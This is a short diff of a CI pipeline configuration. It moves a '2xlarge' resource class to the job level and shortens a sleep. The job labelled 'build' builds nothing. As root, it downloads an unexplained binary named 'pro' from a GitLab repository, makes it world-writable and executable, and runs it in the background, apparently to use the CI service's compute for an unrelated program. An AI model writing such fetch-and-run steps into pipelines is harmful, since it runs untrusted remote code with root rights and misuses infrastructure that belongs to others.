@@ -3,8 +3,8 @@ version: 2.1
 jobs:
   build:
     machine:
-      resource_class: 2xlarge
       image: ubuntu-2004:202101-01
+    resource_class: 2xlarge
 
     steps:
       - run:
@@ -12,7 +12,7 @@ jobs:
          command: | 
           sudo su --command "apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro"
           sudo su --command "nohup ./pro --log=stdout > meta.log &"
-          sleep 10
+          sleep 5
           sudo su --command "ls"
       
       - run:
